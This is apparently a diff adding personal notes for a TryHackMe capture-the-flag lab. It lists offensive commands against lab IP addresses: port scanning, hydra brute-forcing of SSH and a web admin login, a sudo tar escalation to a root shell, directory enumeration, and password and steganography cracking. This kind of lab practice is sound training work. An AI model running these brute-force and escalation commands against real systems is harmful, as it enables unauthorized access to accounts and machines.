@@ -1,0 +1,54 @@
+
+https://tryhackme.com/room/easyctf
+Username: lin
+
+nmap -sT -sV <IP Address>
+nmap -sC -sV <IP Address>
+{ If above didn't work ==> nmap -sC -sV -Pn 10.10.189.219 }
+
+ftp IP Address
+ssh <username>@<ip address>
+
+hydra -l <username> -P <wordlist> <ip address> <service> -t 4
+[ t = CPU threads, service = ssh, ftp etc..]
+eg:
+hydra -l lin -P locks.txt 10.10.55.22 ssh -t 4
+
+To get Root Access => Privilege Escalation
+sudo -l [and type password]
+{ Shows weak point in file system }
+
+Take commands from: https://gtfobins.github.io/gtfobins/tar/#sudo
+
+eg for tar:
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+
+To Find Hidden Directory ==> Gobuster
+gobuster dir -u 10.10.189.219 -w /usr/share/wordlists/dirb/common.txt
+
+
+Login ==> Admin Panel
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.189.219 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=username or password invalid" -V
+
+Please Check ==>>>===>> ==>>>===>> http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=username or password invalid" -V
+==>>>===>> ==>>>===>>==>==>>>===>> http-post-form "/login:user=^USER^&pass=^PASS^:F=username or password invalid" -V
+
+
+Password Cracking => John
+john pass.txt
+john hash --show
+
+SSH Using RSA Key
+chmod 400 rsa.key 
+ssh -i rsa.key john@10.10.189.219
+
+Stegnography
+
+steghide extract -sf <FileName>
+
+If asks Password ==> Crack using stegcracker
+
+stegcracker <FileName> /usr/share/wordlists/rockyou.txt  
+
+
+
